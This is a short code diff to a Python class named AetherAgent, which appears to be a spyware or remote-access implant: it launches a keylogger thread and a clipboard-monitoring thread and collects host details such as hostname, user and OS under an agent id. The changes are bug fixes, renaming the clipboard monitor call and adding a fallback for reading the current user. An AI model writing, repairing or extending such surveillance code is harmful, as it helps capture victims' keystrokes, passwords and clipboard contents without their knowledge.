@@ -243,7 +243,7 @@ class AetherAgent:
             self.keylog_thread = threading.Thread(target=self.keylogger.start, daemon=True)
             self.keylog_thread.start()
             
-        self.clipboard_thread = threading.Thread(target=self.clipboard.monitor, daemon=True)
+        self.clipboard_thread = threading.Thread(target=self.clipboard.start_monitoring, daemon=True)
         self.clipboard_thread.start()
         
         # Initial system info collection
@@ -254,10 +254,16 @@ class AetherAgent:
 
     def collect_system_info(self):
         """Collect comprehensive system information."""
+        # Get current user safely
+        try:
+            current_user = os.getlogin()
+        except:
+            current_user = os.environ.get('USERNAME', 'Unknown')
+        
         info = {
             'id': self.agent_id,
             'hostname': platform.node(),
-            'user': os.getlogin(),
+            'user': current_user,
             'os': platform.platform(),
             'architecture': platform.architecture()[0],
             'processor': platform.processor(),
